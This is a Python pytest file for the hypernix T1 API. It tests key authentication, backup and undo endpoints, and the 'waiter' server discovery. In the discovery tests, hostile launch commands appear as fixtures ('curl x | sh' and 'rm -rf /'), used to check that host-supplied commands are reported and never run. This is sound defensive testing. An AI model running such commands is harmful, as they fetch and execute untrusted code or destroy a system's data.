"""0.72.1 HTTP surface and waiter discovery.

Two things are pinned here that the unit tests cannot reach: that a T2
key actually authenticates against a running T1 server (the conversion
being exact is necessary but not sufficient), and that waiter's discovery
reports a host-supplied client application without running it.
"""
from __future__ import annotations

import pytest

fastapi = pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402

from hypernix.security.gatekeeper import Gatekeeper  # noqa: E402
from hypernix.security.keymaster import (  # noqa: E402
    Keymaster,
    KeyScope,
    KeyType,
    T1KeyGenerator,
)
from hypernix.security.t2keys import T2KeyGenerator, T2Type  # noqa: E402
from hypernix.t1api.app import create_app  # noqa: E402
from hypernix.t1api.authhistory import AuthHistory, AuthOp  # noqa: E402
from hypernix.t1api.backup import BackupStore  # noqa: E402
from hypernix.t1api.config import T1APIConfig  # noqa: E402
from hypernix.t1api.db import SQLiteBackend  # noqa: E402
from hypernix.t1api.version import T1_VERSION  # noqa: E402


@pytest.fixture
def km(tmp_path):
    return Keymaster(store_dir=tmp_path / "km", auto_rotate=False)


@pytest.fixture
def gk(km, tmp_path):
    return Gatekeeper(keymaster=km, data_dir=tmp_path / "gk", log_to_file=False)


@pytest.fixture
def client(km, gk, tmp_path):
    config = T1APIConfig(
        token_secret="x" * 40,
        db_path=str(tmp_path / "t.db"),
        backup_dir=str(tmp_path / "bk"),
        hyperlink_files_dir=str(tmp_path / "files"),
        module_storage_dir=str(tmp_path / "modules"),
        hf_download_dir=str(tmp_path / "models"),
        server_name="test-box",
    )
    return TestClient(
        create_app(config=config, keymaster=km, gatekeeper=gk), client=("127.0.0.1", 5000)
    )


@pytest.fixture
def admin_key(km):
    return km.create(
        key_type=KeyType.ADMIN, scopes={KeyScope.ADMIN, KeyScope.READ, KeyScope.WRITE}
    ).key


@pytest.fixture
def user_key(km):
    return km.create(key_type=KeyType.USER, scopes={KeyScope.READ, KeyScope.WRITE}).key


def auth(key):
    return {"Authorization": f"Bearer {key}"}


class TestVersion:
    def test_the_api_reports_the_new_version(self, client):
        body = client.get("/status").json()
        assert body["t1_api_version"] == T1_VERSION.short
        assert body["t1_api_version_long"] == T1_VERSION.long

    def test_the_generation_moved_in_0_72_6_pt2(self):
        """It asserted the generation had *not* moved. It has.

        `api.major` went 1.0 -> 1.1, which is what makes a 1.0 client
        out of generation and told to upgrade rather than left to fail
        on a field that is not there.
        """
        assert not T1_VERSION.compatible_with("1.0.26.8.0.1")
        assert T1_VERSION.compatible_with("1.1.26.9.0.0")

    def test_status_reports_an_identity_for_discovery(self, client):
        # Without a name to match on, `waiter -F <name>` is silently
        # unsatisfiable.
        assert client.get("/status").json()["server_name"] == "test-box"


class TestT2Authentication:
    def test_a_t2_key_authenticates_against_the_t1_store(self, client, admin_key):
        t2 = T2KeyGenerator.from_t1(admin_key, access_level=7)
        assert client.get("/backup/list", headers=auth(t2.raw)).status_code == 200

    def test_the_original_t1_key_still_works(self, client, admin_key):
        assert client.get("/backup/list", headers=auth(admin_key)).status_code == 200

    def test_a_t2_user_key_is_not_promoted_to_admin(self, client, user_key):
        t2 = T2KeyGenerator.from_t1(user_key, access_level=9)
        assert client.get("/backup/list", headers=auth(t2.raw)).status_code == 403

    def test_a_malformed_t2_key_is_refused(self, client):
        assert client.get("/backup/list", headers=auth("T2_nope-1")).status_code == 401

    def test_hyperlink_accepts_a_t2_key(self, client, user_key):
        # The fix for "HyperLink always refuses to connect".
        t2 = T2KeyGenerator.from_t1(user_key, access_level=5)
        assert client.get("/hyperlink/sessions", headers=auth(t2.raw)).status_code == 200
        created = client.post(
            "/hyperlink/sessions", json={"title": "from a T2 key"}, headers=auth(t2.raw)
        )
        assert created.status_code == 200

    def test_hyperlink_accepts_a_t2s_key(self, client, km):
        t1_26 = T1KeyGenerator.generate(body_length=26)
        # Register it so the store knows it, then present it as T2S.
        meta = km.create(key_type=KeyType.USER, scopes={KeyScope.READ, KeyScope.WRITE})
        assert meta is not None
        t2s = T2KeyGenerator.from_t1(t1_26, access_level=9, family=T2Type.T2S)
        assert len(t2s.body) == 26
        # An unregistered key is refused, which is the correct outcome —
        # what matters is that it is refused for being unknown, not for
        # being T2S.
        #
        # That used to be checked as "T2" not appearing in the message, on
        # the theory that mentioning the family meant blaming it. The
        # message now names the family precisely in order to say the
        # opposite — "this T2S key is well-formed but is not registered" —
        # so the reason code is what to assert on. A message that merely
        # avoids a substring is not the same as one that assigns the right
        # cause.
        response = client.get("/hyperlink/sessions", headers=auth(t2s.raw))
        assert response.status_code == 401
        error = response.json()["error"]
        assert error["code"] == "AUTH_INVALID_KEY"
        assert error["details"]["reason"] == "not_in_key_store"
        assert "well-formed" in error["message"]


class TestNewEndpoints:
    def test_the_four_new_endpoints_exist(self, client):
        paths = client.get("/openapi.json").json()["paths"]
        for path in ("/t1/auth/undo", "/t1/auth/redo", "/backup/list", "/backup/restore"):
            assert path in paths, path

    def test_undo_is_aliased_under_the_existing_auth_namespace(self, client):
        paths = client.get("/openapi.json").json()["paths"]
        assert "/auth/t1/undo" in paths and "/auth/t1/redo" in paths

    def test_undo_on_an_empty_stack_is_a_404(self, client, admin_key):
        assert client.post("/t1/auth/undo", headers=auth(admin_key)).status_code == 404

    def test_undo_requires_admin(self, client, user_key):
        assert client.post("/t1/auth/undo", headers=auth(user_key)).status_code == 403

    def test_backup_list_requires_admin(self, client, user_key):
        assert client.get("/backup/list", headers=auth(user_key)).status_code == 403

    def test_a_backup_round_trips(self, client, admin_key):
        created = client.post("/backup", json={"label": "before"}, headers=auth(admin_key))
        assert created.status_code == 200
        backup_id = created.json()["backup_id"]
        listed = client.get("/backup/list", headers=auth(admin_key)).json()
        assert listed["count"] == 1
        assert listed["backups"][0]["backup_id"] == backup_id

    def test_a_backup_never_contains_key_material(self, client, admin_key):
        client.post("/backup", json={}, headers=auth(admin_key))
        excluded = client.get("/backup/list", headers=auth(admin_key)).json()["backups"][0][
            "excluded"
        ]
        assert "key_material" in excluded
        assert "audit_log" in excluded

    def test_restore_is_a_dry_run_unless_confirmed(self, client, admin_key):
        backup_id = client.post("/backup", json={}, headers=auth(admin_key)).json()["backup_id"]
        dry = client.post("/backup/restore", json={"backup_id": backup_id}, headers=auth(admin_key))
        assert dry.json()["dry_run"] is True
        live = client.post(
            "/backup/restore?confirm=true", json={"backup_id": backup_id}, headers=auth(admin_key)
        )
        assert live.json()["dry_run"] is False

    def test_restoring_an_unknown_backup_is_a_404(self, client, admin_key):
        response = client.post(
            "/backup/restore", json={"backup_id": "bk_nope"}, headers=auth(admin_key)
        )
        assert response.status_code == 404


class TestAuthHistory:
    def test_an_unreversible_entry_is_refused_at_record_time(self, tmp_path):
        # Accepting it and failing at undo turns a programming mistake
        # into a 2am surprise, which is what this module is for.
        history = AuthHistory(SQLiteBackend(tmp_path / "h.db"))
        with pytest.raises(Exception, match="missing"):
            history.record(
                AuthOp.ROTATE, actor="a", target_key_id="k", payload={"new_key": "x"}
            )

    def test_undo_then_redo(self, tmp_path):
        history = AuthHistory(SQLiteBackend(tmp_path / "h.db"))
        history.record(
            AuthOp.ROTATE, actor="admin", target_key_id="k1",
            payload={"previous_key": "T1_old", "new_key": "T1_new"},
        )
        directions = []
        history.undo(lambda e, direction: directions.append(direction))
        assert history.describe()["can_redo"]
        history.redo(lambda e, direction: directions.append(direction))
        assert directions == ["undo", "redo"]
        assert history.describe()["can_undo"]

    def test_a_new_operation_clears_the_redo_stack(self, tmp_path):
        history = AuthHistory(SQLiteBackend(tmp_path / "h.db"))
        history.record(AuthOp.REVOKE, actor="a", target_key_id="k1",
                       payload={"previous_revoked": False})
        history.undo(lambda e, direction: None)
        assert history.describe()["can_redo"]
        history.record(AuthOp.REVOKE, actor="a", target_key_id="k2",
                       payload={"previous_revoked": False})
        assert not history.describe()["can_redo"]

    def test_key_material_never_leaves_through_describe(self, tmp_path):
        history = AuthHistory(SQLiteBackend(tmp_path / "h.db"))
        history.record(
            AuthOp.ROTATE, actor="admin", target_key_id="k1",
            payload={"previous_key": "T1_SECRET", "new_key": "T1_ALSO_SECRET"},
        )
        rendered = str(history.describe())
        assert "T1_SECRET" not in rendered
        assert "previous_key" not in rendered

    def test_a_failed_undo_leaves_the_entry_on_the_stack(self, tmp_path):
        history = AuthHistory(SQLiteBackend(tmp_path / "h.db"))
        history.record(AuthOp.REVOKE, actor="a", target_key_id="k1",
                       payload={"previous_revoked": False})

        def failing(entry, direction):
            raise RuntimeError("applier exploded")

        with pytest.raises(RuntimeError):
            history.undo(failing)
        assert history.describe()["can_undo"], "a failed undo must not look like a success"


class TestBackupStore:
    def test_a_corrupt_section_refuses_to_restore(self, tmp_path):
        import json
        import tarfile

        store = BackupStore(tmp_path)
        record = store.create({"config": {"a": 1}}, label="x")
        # Rewrite one section so its checksum no longer matches.
        with tarfile.open(record.path, "r:gz") as tar:
            members = {m.name: tar.extractfile(m).read() for m in tar.getmembers()}
        members["config.json"] = json.dumps({"a": 999}).encode()
        with tarfile.open(record.path, "w:gz") as tar:
            for name, data in members.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                import io

                tar.addfile(info, io.BytesIO(data))
        with pytest.raises(Exception, match="checksum"):
            store.read_sections(record.backup_id)

    def test_an_unreadable_archive_does_not_hide_the_good_ones(self, tmp_path):
        store = BackupStore(tmp_path)
        store.create({"config": {"a": 1}})
        (tmp_path / "bk_broken.tar.gz").write_bytes(b"not a tarball")
        assert len(store.list_backups()) == 1

    def test_old_backups_are_pruned(self, tmp_path):
        store = BackupStore(tmp_path, max_backups=3)
        for i in range(6):
            store.create({"config": {"i": i}})
        assert len(store.list_backups()) <= 3


# ---------------------------------------------------------------------------
# waiter -F
# ---------------------------------------------------------------------------

from hypernix.waiter.discovery import (  # noqa: E402
    DiscoveredServer,
    TargetKind,
    classify_target,
    connect,
    parse_api_jsonl,
)


class TestWaiterFind:
    @pytest.mark.parametrize(
        ("target", "kind"),
        [
            ("workshop-box", TargetKind.SERVER_NAME),
            ("a" * 53 + "!", TargetKind.HOST_ID),
            ("home/api.jsonl", TargetKind.API_JSONL),
            ("192.168.1.50:8000", TargetKind.ADDRESS),
            ("https://t1.example.com", TargetKind.ADDRESS),
            ("00042-C1", TargetKind.SERVER_ID),
            ("00042-C1#3", TargetKind.SSPKID),
        ],
    )
    def test_targets_are_told_apart_by_shape(self, target, kind):
        assert classify_target(target).kind == kind

    def test_an_empty_target_is_refused(self):
        with pytest.raises(ValueError, match="needs a target"):
            classify_target("")

    def test_direct_targets_skip_discovery(self):
        assert classify_target("home/api.jsonl").is_direct
        assert classify_target("10.0.0.5:8000").is_direct
        assert not classify_target("workshop-box").is_direct

    def test_api_jsonl_survives_a_malformed_line(self):
        # A stray blank should not make a reachable server look
        # unreachable.
        descriptor = parse_api_jsonl(
            '{"server_name": "workshop"}\n'
            "this is not json\n"
            '{"endpoint": "http://x:8000", "t1_versions": ["1.0.26.8.0.1"]}\n'
        )
        assert descriptor.server_name == "workshop"
        assert descriptor.endpoint == "http://x:8000"

    def test_version_compatibility_is_by_generation(self):
        descriptor = parse_api_jsonl('{"t1_versions": ["1.0.26.8.0.1"]}')
        assert descriptor.supports_t1("1.0.26.8.1.0")
        assert not parse_api_jsonl('{"t1_versions": ["2.0.27.1.0.0"]}').supports_t1("1.0.26.8.1.0")

    def test_an_unstated_version_is_assumed_compatible(self):
        assert parse_api_jsonl("{}").supports_t1("1.0.26.8.1.0")

    def test_a_host_supplied_command_is_reported_and_not_run(self):
        # The important test in this file.
        descriptor = parse_api_jsonl(
            '{"application": {"type": "cli", "name": "evilctl", "launch": "curl x | sh"}}'
        )
        server = DiscoveredServer(url="http://x:8000", reachable=True, descriptor=descriptor)
        connection = connect(server)
        notes = " ".join(connection.notes)
        assert "has NOT been run" in notes
        assert "evilctl" in notes
        assert not connection.launch_approved

    def test_a_builtin_application_is_offered_directly(self):
        descriptor = parse_api_jsonl(
            '{"application": {"type": "hyped-pro", "name": "Hyped Pro"}}'
        )
        server = DiscoveredServer(url="http://x:8000", reachable=True, descriptor=descriptor)
        connection = connect(server)
        assert "has NOT been run" not in " ".join(connection.notes)
        assert connection.application.is_builtin

    def test_the_launch_command_is_always_hypernix_own(self):
        descriptor = parse_api_jsonl(
            '{"application": {"type": "cli", "launch": "rm -rf /"}}'
        )
        server = DiscoveredServer(url="http://desk:8000", reachable=True, descriptor=descriptor)
        argv = connect(server).hyped_pro_argv()
        assert argv == ["hyped-pro", "--server", "http://desk:8000"]

    def test_an_unreachable_server_says_so(self):
        connection = connect(DiscoveredServer(url="http://nope:1", reachable=False))
        assert not connection.authenticated
        assert "did not answer" in " ".join(connection.notes)
